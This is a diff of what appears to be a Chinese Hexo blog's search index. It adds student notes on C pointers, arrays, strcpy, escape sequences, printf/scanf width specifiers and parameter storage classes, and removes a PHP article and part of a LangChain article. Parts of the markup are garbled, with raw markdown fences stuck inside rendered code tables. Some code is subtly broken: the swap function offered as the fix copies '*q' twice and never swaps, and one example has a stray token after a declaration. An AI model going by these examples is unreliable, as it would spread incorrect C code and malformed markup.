printf(&quot;%d&quot;,a); </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+</code></pre>
 </li>
 <li><p>如上代码，先把<code>p</code>用<code>*</code>号解包，<strong>代表此时指针是具体值</strong>,具体值的值发生改变，那么所指向的值也会改变。此时输出值为<code>7</code></p>
+</li>
+</ul>
+<h4 id="基础2"><a href="#基础2" class="headerlink" title="基础2"></a>基础2</h4><ul>
+<li><p><strong>指针必须要先指向一个地址，有内存空间的指向才可以接收其他的值</strong></p>
+</li>
+<li><p>比如：</p>
+</li>
+<li><pre><code class="language-c">#include &lt;stdio.h&gt;
+
+void swap( int *p,int *q)
+&#123; int *t;
+*t=*p; *p=*q; *q=*t;
+&#125;
+//main()略..
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">* 这里的指针变量`t`虽然已经声明，但是没有指向任何一个内存地址，不可以用来存放其他变量的值</span><br><span class="line"></span><br><span class="line">* 比如:</span><br><span class="line"></span><br><span class="line">* ```c</span><br><span class="line">  #include &lt;stdio.h&gt;</span><br><span class="line">  #include &lt;stdlib.h&gt;</span><br><span class="line">  </span><br><span class="line">  void swap(int *p,int *q)</span><br><span class="line">  &#123;int *t;</span><br><span class="line">   t = (int *)malloc(sizeof(int));</span><br><span class="line">   *t = *q,*p = *q,*q = *t;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+<li><p>如该代码，指针变量<code>t</code>初始已经指向了一个动态分配的地址，可以用于接收变量。</p>
 </li>
 </ul>
 <h4 id="函数中的操作"><a href="#函数中的操作" class="headerlink" title="函数中的操作"></a>函数中的操作</h4><ul>
@@ -1483,7 +1593,7 @@ int main()&#123;
 </li>
 <li><p>这里就是对类似于指针的数组<code>c</code>进行了解包,但是默认解包出来的数是数组的第一个数，即<code>1</code>,若要对下一位数进行解包,可以这样进行解包:<code>printf(&quot;%d&quot;, *(c+1))&#39;;</code>会输出:<code>2</code> 相当于:<code>+1</code>是为了移位,<code>*</code>是为了解包。</p>
 </li>
-<li><p>这里我们可以知道一个规律是怎么来的了:**为什么编程语言的索引都是从0开始?**因为,在c语言中；对于数组<code>c</code>,<code>*(c+1)</code>和<code>c[1]</code>都是一个道理,为了保证形式上的相同，所以这样干。</p>
+<li><p>这里我们可以知道一个规律是怎么来的了:**为什么编程语言的索引都是从0开始?**因为,在c语言中；对于数组<code>c</code>,<code>*(c+1)</code>和<code>c[1]</code>都是一个道理,为了保证形式上的相同，所以这样干。<strong>数组索引不可以使用’()’</strong></p>
 </li>
 <li><p>我们这里可以继续说:</p>
 </li>
@@ -1521,37 +1631,72 @@ int main()&#123;
 </ul>
 <h4 id="自定义数据结构里面的指针"><a href="#自定义数据结构里面的指针" class="headerlink" title="自定义数据结构里面的指针"></a>自定义数据结构里面的指针</h4><ul>
 <li>有以下例题:</li>
-<li><style>.syrilzjvvpit{zoom:150%;}</style><img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250305135039466.png" class="syrilzjvvpit" alt="image-20250305135039466"></li>
+<li><style>.bguyhhmvnlbp{zoom:150%;}</style><img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250305135039466.png" class="bguyhhmvnlbp" alt="image-20250305135039466"></li>
 <li>要点一:对于<code>struct st a[3] = &#123;5,&amp;a[0], 6,&amp;a[1], 7,&amp;a[2]&#125;, *p;</code>这里由于该结构在初始化的时候，需要两个值来初始化，所以<code>5,&amp;a[0]</code>就构成了数组<code>a</code>的第一个元素<code>a[0]</code>的初始化内容 ，<code>6,&amp;a[1]</code> 、<code>7,&amp;a[2]</code>分别对应<code>a[1]</code>和<code>a[2]</code>的初始化内容。</li>
 <li>要点二:这里对<code>st</code>数据结构数组的值的导入，比如:<code>5,&amp;a[0]</code>,这里第二个值为<code>&amp;a[0]</code>，就是对<code>st *next</code>的赋值，即指向的下一个元素是它本身。</li>
 <li>要点三:指针的数据结构必须和要指向的目标元素的类型相同，才可以进行指向。</li>
 <li>要点四:<code>p=&amp;a[0]</code>,这里就是指向数组a的第一个元素的的地址，包含：<code>(int n ,struct st *next)</code>,我们对指针进行移动:<code>(++p)</code>,再进行指向:<code>-&gt;</code>,<strong>其中:<code>-&gt;</code>这个方法就已经对数据结构其中的元素进行了解包</strong>,所以不需要<code>*p</code>对数据解包了。</li>
 </ul>
-<h1 id="3-3"><a href="#3-3" class="headerlink" title="3.3"></a>3.3</h1><h3 id="数组特性"><a href="#数组特性" class="headerlink" title="数组特性"></a>数组特性</h3><ul>
+<h1 id="3-3"><a href="#3-3" class="headerlink" title="3.3"></a>3.3</h1><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="数组长度特性"><a href="#数组长度特性" class="headerlink" title="数组长度特性"></a>数组长度特性</h3><ul>
 <li>比如该题:</li>
 <li><img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250303074823302.png" class="" title="image-20250303074823302"></li>
 <li>如解析所示,不多说</li>
 </ul>
-<h1 id="3-4"><a href="#3-4" class="headerlink" title="3.4"></a>3.4</h1><h3 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h3><ul>
-<li><p>如下例题:</p>
+<h3 id="字符数组结尾特性"><a href="#字符数组结尾特性" class="headerlink" title="字符数组结尾特性"></a>字符数组结尾特性</h3><ul>
+<li><code>char str[]=&quot;Hello&quot;,*p;p=str;</code>此时<code>*(p+5)</code>中的值为<code>&quot;\0&quot;</code>,因为前五个元素为<code>Hello</code>,第六个元素自动赋值为<code>&quot;\0&quot;</code>。</li>
+</ul>
+<h3 id="数组指针特性"><a href="#数组指针特性" class="headerlink" title="数组指针特性"></a>数组指针特性</h3><img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250323164542042.png" class="" title="image-20250323164542042">
+
+<ul>
+<li>如上图所示，数组名也代表了数组首位元素的地址。</li>
+</ul>
+<h3 id="函数strcpy"><a href="#函数strcpy" class="headerlink" title="函数strcpy()"></a>函数<code>strcpy()</code></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> s[] = <span class="string">&quot;Beijing&quot;</span>;</span><br><span class="line">    <span class="comment">// 先使用strcpy将&quot;China&quot;复制到s中，再用strlen获取复制后字符串长度并输出</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">strlen</span>(<span class="built_in">strcpy</span>(s, <span class="string">&quot;China&quot;</span>))); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>strcpy(s, &quot;China&quot;)</code> ：<code>strcpy</code> 函数功能是把第二个参数（源字符串 <code>&quot;China&quot;</code> ）拷贝到第一个参数 <code>s</code> 指向的字符串空间中，此函数会返回目标字符串的首地址，也就是 <code>s</code> 的首地址 。执行后，数组 <code>s</code> 中的内容从 <code>&quot;Beijing&quot;</code> 变为 <code>&quot;China&quot;</code> 。</li>
+<li><code>strlen(strcpy(s, &quot;China&quot;))</code> ：<code>strlen</code> 函数用于计算字符串长度，统计的是字符串中字符的个数（不包含字符串结束符 <code>&#39;\0&#39;</code> ） 。因为 <code>strcpy(s, &quot;China&quot;)</code> 执行后 <code>s</code> 内容是 <code>&quot;China&quot;</code> ，它有 5 个字符，所以 <code>strlen</code> 函数返回值为 5 。</li>
+<li>最后 <code>printf(&quot;%d\n&quot;, strlen(strcpy(s, &quot;China&quot;)));</code> 输出的就是 <code>strlen</code> 函数的返回值 5 。</li>
+</ul>
+<h3 id="数组和指针的区分"><a href="#数组和指针的区分" class="headerlink" title="数组和指针的区分"></a>数组和指针的区分</h3><ul>
+<li><p>首先，对于字符数组名<code>array</code>和字符指针名<code>strp</code>,前者名字本身就指的是数组第一个元素的地址，后者则接收一个元素的地址。</p>
 </li>
-<li><img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250304074758892.png" class="" title="image-20250304074758892"></li>
+<li><p>其次，前者为常量，不可以再赋值，而后者为变量，可以再进行赋值</p>
+</li>
+<li><p>所以，一般对字符串型数组的赋值，都在初始化的时候完成,比如：<code>char array[] = &quot;hello world&quot;</code>,不可以有：</p>
+</li>
+<li><pre><code class="language-c">char name[];
+name = &quot;MMK&quot;;
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">* 因为这里的`name`代表了数组第一个字符型数据元素的地址，不可以直接用一个字符串数组对其赋值。</span><br><span class="line"></span><br><span class="line">* 要想之后改变数组的值，可以用指针遍历，也可以：借助`strcpy`（字符串复制）、`strncpy`（指定长度字符串复制）等函数来实现对字符数组的赋值。</span><br><span class="line"></span><br><span class="line">* 例题：</span><br><span class="line"></span><br><span class="line">* &#123;% asset_img image-20250323172052232.png image-20250323172052232 %&#125;</span><br><span class="line"></span><br><span class="line">* 这里，BCD选项很好排除，A选项，就是把`&quot;Hello World&quot;`首位地址给了字符指针`str`。</span><br><span class="line"></span><br><span class="line"># 3.4 </span><br><span class="line"></span><br><span class="line">### 静态变量</span><br><span class="line"></span><br><span class="line">* 如下例题:</span><br><span class="line"></span><br><span class="line">* &#123;% asset_img image-20250304074758892.png image-20250304074758892 %&#125;</span><br><span class="line"></span><br><span class="line"># 3.5</span><br><span class="line"></span><br><span class="line">### 宏</span><br><span class="line"></span><br><span class="line">#### 就是一个简单的替换</span><br><span class="line"></span><br><span class="line">* 我们可以看如下例题:</span><br><span class="line">* &#123;% asset_img image-20250305133059085.png image-20250305133059085 %&#125;</span><br><span class="line">* 由题可知:`F(5)`会被替换为:`F(x) 2.84+x`,在这道例题里面,`F(x)`被替换之后，是直接单纯被替换:会变成:`2.84+x*2`,不会自己多加什么运算顺序,不会变成:`(2.84+x)*2`。</span><br><span class="line"></span><br><span class="line">#### `EOF`:文件结束标志</span><br><span class="line"></span><br><span class="line">* &#123;% asset_img image-20250323132436519.png image-20250323132436519 %&#125;</span><br><span class="line"></span><br><span class="line"># 3.17</span><br><span class="line"></span><br><span class="line">## 结构数据(持续更新)</span><br><span class="line"></span><br><span class="line">### 数组赋值</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">struct st&#123;</span><br><span class="line">    int n;</span><br><span class="line">    struct st *next;</span><br><span class="line">&#125;</span><br><span class="line">struct st a[3] = &#123; 5,&amp;a[0], 6,&amp;a[1], 7,&amp;a[2] &#125;, *p;</span><br><span class="line">p = &amp;a[0];</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
 </ul>
-<h1 id="3-5"><a href="#3-5" class="headerlink" title="3.5"></a>3.5</h1><h3 id="宏"><a href="#宏" class="headerlink" title="宏"></a>宏</h3><h4 id="就是一个简单的替换"><a href="#就是一个简单的替换" class="headerlink" title="就是一个简单的替换"></a>就是一个简单的替换</h4><ul>
-<li>我们可以看如下例题:</li>
-<li><img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250305133059085.png" class="" title="image-20250305133059085"></li>
-<li>由题可知:<code>F(5)</code>会被替换为:<code>F(x) 2.84+x</code>,在这道例题里面,<code>F(x)</code>被替换之后，是直接单纯被替换:会变成:<code>2.84+x*2</code>,不会自己多加什么运算顺序,不会变成:<code>(2.84+x)*2</code>。</li>
+<h3 id="引用成员"><a href="#引用成员" class="headerlink" title="引用成员"></a>引用成员</h3><img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250323133256991.png" class="" title="image-20250323133256991">
+
+<ul>
+<li>注释:</li>
+<li><ul>
+<li>在结构体的引用中,采用以下三种方式来引用结构体中的成员:</li>
+<li>结构体变量名.成员名</li>
+<li>指针变量名-&gt;成员名</li>
+<li>(*指针变量名).成员名</li>
 </ul>
-<h1 id="3-17"><a href="#3-17" class="headerlink" title="3.17"></a>3.17</h1><h2 id="结构数据-持续更新"><a href="#结构数据-持续更新" class="headerlink" title="结构数据(持续更新)"></a>结构数据(持续更新)</h2><h3 id="数组赋值"><a href="#数组赋值" class="headerlink" title="数组赋值"></a>数组赋值</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">st</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">st</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">st</span> <span class="title">a</span>[3] =</span> &#123; <span class="number">5</span>,&amp;a[<span class="number">0</span>], <span class="number">6</span>,&amp;a[<span class="number">1</span>], <span class="number">7</span>,&amp;a[<span class="number">2</span>] &#125;, *p;</span><br><span class="line">p = &amp;a[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>
-
-
-
+</li>
+</ul>
 <h1 id="3-20"><a href="#3-20" class="headerlink" title="3.20"></a>3.20</h1><h2 id="数值表示方法"><a href="#数值表示方法" class="headerlink" title="数值表示方法"></a>数值表示方法</h2><h3 id="不同进制数的表述方法"><a href="#不同进制数的表述方法" class="headerlink" title="不同进制数的表述方法"></a>不同进制数的表述方法</h3><ul>
 <li><p>二进制：<code>0b</code>或<code>0B</code></p>
 </li>
 <li><p>八进制：0开头,如<code>010</code></p>
 </li>
+<li><ul>
+<li>注意题目里面的陷阱:<code>strlen(&quot;\t\065&quot;)</code>;<code>\065</code>指的是8进制字符，算一位字符。</li>
+<li>我想说的就是,8进制数，也可以通过转义符<code>\</code>使用<code>\0</code>来表示</li>
+</ul>
+</li>
 <li><p>十六进制：<code>0x</code>开头</p>
+</li>
+<li><ul>
+<li>十六进制的数，可以通过转义符<code>\</code>使用<code>\x</code>进行表示。</li>
+</ul>
 </li>
 </ul>
 <h2 id="基础概念-1"><a href="#基础概念-1" class="headerlink" title="基础概念"></a>基础概念</h2><h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><ul>
@@ -1565,6 +1710,63 @@ int main()&#123;
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    int num = 10;</span></span><br><span class="line"><span class="comment">    /* 这是错误的嵌套注释 */</span></span><br><span class="line">    num++;</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
 
 <p>不过在 C99 及之后标准引入的<code>//</code> 单行注释可以在<code>/* */</code> 注释中使用 ，但这不属于严格意义上的注释嵌套，所以该选项错误。</p>
+<h1 id="3-23"><a href="#3-23" class="headerlink" title="3.23"></a>3.23</h1><h2 id="占位符"><a href="#占位符" class="headerlink" title="占位符"></a>占位符</h2><h3 id="格式控制符"><a href="#格式控制符" class="headerlink" title="格式控制符"></a>格式控制符</h3><ul>
+<li><p>如<code>%2d</code>:</p>
+</li>
+<li><p><strong>在<code>printf</code>函数里的含义</strong></p>
+<p><code>%2d</code>用于输出整数，其中的<code>2</code>代表最小字段宽度。也就是说，输出的整数至少会占据 2 个字符的宽度。若整数的位数不足 2 位，就会在左边补空格；若整数的位数超过 2 位，则按实际位数输出。</p>
+<p>以下是示例代码：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> num1 = <span class="number">5</span>;</span><br><span class="line">    <span class="type">int</span> num2 = <span class="number">123</span>;<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#x27;%2d&#x27;\n&quot;</span>, num1); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#x27;%2d&#x27;\n&quot;</span>, num2); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此代码的输出结果为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; 5&#x27;</span><br><span class="line">&#x27;123&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>在输出<code>num1</code>时，因为<code>5</code>仅有 1 位，所以在左边补了一个空格，以此达到最小宽度 2；而<code>num2</code>有 3 位，超过了最小宽度 2，就按实际位数输出。</p>
+<p><strong>在<code>scanf</code>函数里的含义</strong></p>
+<p>在<code>scanf</code>函数中，<code>%2d</code>表示最多读取 2 位数字作为整数输入。</p>
+<p>以下是示例代码：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入一个整数：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%2d&quot;</span>, &amp;num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;你输入的整数是：%d\n&quot;</span>, num);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>若你输入<code>123</code>，<code>scanf</code>只会读取前 2 位数字<code>12</code>，并将其赋值给变量<code>num</code>。最终程序会输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">你输入的整数是：12</span><br></pre></td></tr></table></figure>
+
+<p>综上所述，<code>%2d</code>在输出时规定了最小字段宽度，在输入时限制了最多读取的数字位数。</p>
+<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="有关函数形参"><a href="#有关函数形参" class="headerlink" title="有关函数形参"></a>有关函数形参</h3></li>
+<li><p>当没有指定C语言中函数形参的储存类别时，函数形参的储存类别是<strong>自动</strong></p>
+</li>
+<li><p><strong>（extern）</strong> ：<code>extern</code>用于声明变量或函数的作用域为外部链接，即该变量或函数在其他源文件中定义，可在当前文件中使用。它不是函数形参默认的存储类别 。比如在一个多文件项目中，若在<code>file2.c</code>中定义了<code>int num;</code> ，在<code>file1.c</code>中想使用它，就用<code>extern int num;</code>声明。但函数形参不会默认是这种存储类别 。</p>
+</li>
+<li><p><strong>（static）</strong> ：<code>static</code>修饰的变量具有静态存储期，在程序运行期间一直存在。局部变量被<code>static</code>修饰后，其生命周期延长到程序结束，且只初始化一次。函数形参不会默认是静态存储类别 ，因为若形参是静态的，每次函数调用时其值就不会像正常情况那样根据实参传递新值，而是保留上次调用结束时的值，这不符合函数形参常规语义 。</p>
+</li>
+<li><p><strong>（register）</strong> ：<code>register</code>建议编译器将变量存储在寄存器中，以加快访问速度。但这只是一种请求，编译器不一定会采纳。而且函数形参默认不是这种存储类别 ，因为编译器会综合考虑寄存器资源等因素来决定是否将变量放入寄存器，不会默认将形参作为寄存器变量 。</p>
+</li>
+<li><p><strong>（auto）</strong> ：<code>auto</code>表示自动存储类别，函数形参在没有指定存储类别的情况下，默认就是<code>auto</code>类型 。自动变量存储在栈区，在函数调用时为形参分配内存空间，函数调用结束时，该内存空间被释放。比如<code>void func(int a)</code> ，这里的<code>a</code>默认就是<code>auto</code>存储类别，在函数被调用时创建，函数执行完销毁。</p>
+</li>
+</ul>
+<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><h3 id="数据输出"><a href="#数据输出" class="headerlink" title="数据输出"></a>数据输出</h3><ul>
+<li><img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250323132638028.png" class="" title="image-20250323132638028"></li>
+</ul>
+<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><ul>
+<li>C 语言中有整型常量、实型常量、字符型常量、字符串常量等不同类型。</li>
+<li><img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250323152013218.png" class="" title="image-20250323152013218"></li>
+</ul>
+<h3 id="实型常量"><a href="#实型常量" class="headerlink" title="实型常量"></a>实型常量</h3><ul>
+<li><img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250323152126941.png" class="" title="image-20250323152126941"></li>
+</ul>
+<h2 id="字符和字符串"><a href="#字符和字符串" class="headerlink" title="字符和字符串"></a>字符和字符串</h2><p><strong>字符与字符串的表示</strong></p>
+<ul>
+<li><strong>字符</strong>：在 C 语言中用单引号<code>&#39; &#39;</code>表示，如<code>&#39;a&#39;</code> ，代表单个字符，存储的是对应 ASCII 码值，本质为整数，占用 1 个字节。</li>
+<li><strong>字符串</strong>：用双引号<code>&quot; &quot;</code>表示 ，如<code>&quot;abc&quot;</code> ，是由 0 个或多个字符组成的序列，编译器自动在末尾添加<code>&#39;\0&#39;</code>作为结束标志，占用字节数为字符数加 1。</li>
+</ul>
+<p><strong>占位符</strong></p>
+<ul>
+<li><strong>字符占位符</strong>：<code>%c</code> ，用于<code>printf</code>输出和<code>scanf</code>输入单个字符。</li>
+<li><strong>字符串占位符</strong>：<code>%s</code> ，用于<code>printf</code>输出和<code>scanf</code>输入以<code>&#39;\0&#39;</code>结尾的字符数组（即字符串 ）。</li>
+</ul>
+<p><strong>例题</strong></p>
+<ul>
+<li><img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250323170425273.png" class="" title="image-20250323170425273"></li>
+</ul>
 ]]></content>
       <categories>
         <category>c语言</category>
@@ -1574,75 +1776,14 @@ int main()&#123;
       </tags>
   </entry>
   <entry>
-    <title>if代码执行机制</title>
-    <url>/2025/01/14/if%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%9C%BA%E5%88%B6/</url>
-    <content><![CDATA[<h3 id="这里我们总结if代码块中布尔值的多少对程序进程的影响"><a href="#这里我们总结if代码块中布尔值的多少对程序进程的影响" class="headerlink" title="这里我们总结if代码块中布尔值的多少对程序进程的影响"></a>这里我们总结if代码块中布尔值的多少对程序进程的影响</h3><h4 id="if条件小括号内的情况"><a href="#if条件小括号内的情况" class="headerlink" title="if条件小括号内的情况"></a>if条件小括号内的情况</h4><h5 id="if括号内为false"><a href="#if括号内为false" class="headerlink" title="if括号内为false"></a>if括号内为false</h5><p>毫无疑问,if代码块里面的代码不会继续运行,此时整个程序会跳过条件括号里为false的这个if代码块继续往下运行。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;This will not be printed&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This will be printed because the if condition was false&quot;</span>;</span><br></pre></td></tr></table></figure>
-<p>在上述代码中，因为 if 条件为 false，echo “This will not be printed”; 不会被执行，程序直接执行 echo “This will be printed because the if condition was false”。</p>
-<h5 id="if括号里为true"><a href="#if括号里为true" class="headerlink" title="if括号里为true"></a>if括号里为true</h5><p>当 if 括号内条件为 true 时，if 代码块内的代码会执行。但这并不意味着整个程序会不受影响地继续运行。<br>取决于 if 代码块内的代码：<br>如果 if 代码块内有 return、exit 或 die 等终止程序或函数的语句，程序或函数的执行会被终止。<br>比如:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exampleFunction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;This will be printed&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;This will not be printed because of the return statement&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">exampleFunction</span>();</span><br></pre></td></tr></table></figure>
-<p>在这种情况下,if代码块内因为有return,所以在同一函数代码空间的echo语句不会被执行。也就是在这一层代码空间内，程序的运行确实被终止了。<br>这就引出了我们接下来要说的一种情况:</p>
-<h4 id="return的辨析"><a href="#return的辨析" class="headerlink" title="return的辨析"></a>return的辨析</h4><p>其实我们在这里可以把return,die,exit这几个对程序运行都有影响的一起说了。<br>1.首先是return，它在,不管是返回什么布尔值,都会使<strong>同一空间代码</strong>停止运行,<br>如果在函数内,它就会使return之后的代码无法运行,如果在类中,也是一样，而我们不推荐把它放在全局代码空间中,这样会使得整个程序停止运行。<br>例如:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exampleFunction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Before return&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">// 这里的条件可以根据需要修改</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;After return&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">exampleFunction</span>();</span><br></pre></td></tr></table></figure>
-<p>在函数外依然可以调用这个函数,函数外并没有因为前面函数里面有return而被打断,但是这里就只会<br>输出:Before return,不会输出After return<br>在类,即对象class里面情况类似</p>
-<p>在文件包含的情况下:<br>在被包含文件:”included_file.php”内:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Before return in included file&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;After return in included file&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>再在另外一个文件中包含它:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;included_file.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is after including the file&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>只会输出:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Before return in included file</span><br><span class="line">This is after including the file</span><br></pre></td></tr></table></figure>
-<p>即:在被包含文件自己代码中,return后面的After return in included file没有输出，程序终止。<br>但是并没有影响去包含这个文件的主文件在后方的”This is after including the file”这句话的输出,<br>所以在文件包含的情景下,return也只会终止自己文件后方的代码，对主文件没有影响。</p>
-<p>2.而die,exit则会直接使整个程序不可运行,没有代码空间的说法。</p>
-]]></content>
+    <title>linux基础</title>
+    <url>/2025/01/11/linux%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[]]></content>
       <categories>
-        <category>php</category>
+        <category>Linux</category>
       </categories>
       <tags>
-        <tag>php条件函数</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>langchain历史记录管理</title>
-    <url>/2025/02/20/langchain%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E7%AE%A1%E7%90%86/</url>
-    <content><![CDATA[<h1 id="langchain历史记录管理"><a href="#langchain历史记录管理" class="headerlink" title="langchain历史记录管理"></a>langchain历史记录管理</h1><h2 id="输入的消息类型"><a href="#输入的消息类型" class="headerlink" title="输入的消息类型:"></a>输入的消息类型:</h2><ul>
-<li><p>关于Message的基本介绍可用看这:<a href="https://python.langchain.com.cn/docs/modules/model_io/models/chat/">langchain基本Messages</a></p>
-</li>
-<li><p>这里说说基本的用法(重在区别BaseMessage,HumanMessage,AIMessage)</p>
-</li>
-<li><ul>
-<li><p>如以下代码:</p>
-</li>
-<li><pre><code class="language-python"># 先写 InMemoryMessageHistory，对获取的消息进行处理并获取历史记录列表！
-    class InMemoryMessageHistory(BaseChatMessageHistory, BaseModel):
-        messages: List[BaseMessage] = Field(default_factory=list)
-
-        # 添加并处理对话记录
-        def add_message(self, message: BaseMessage) -&gt; None:
-            self.messages.append(message)
-
-        def clear(self) -&gt; None:
-            self.messages = []
-</code></pre>
-</li>
-<li><p>这里为什么将总消息列表设置为元素均受<code>BaseMessage</code>类的列表呢?</p>
-</li>
-<li><p>原因:</p>
-</li>
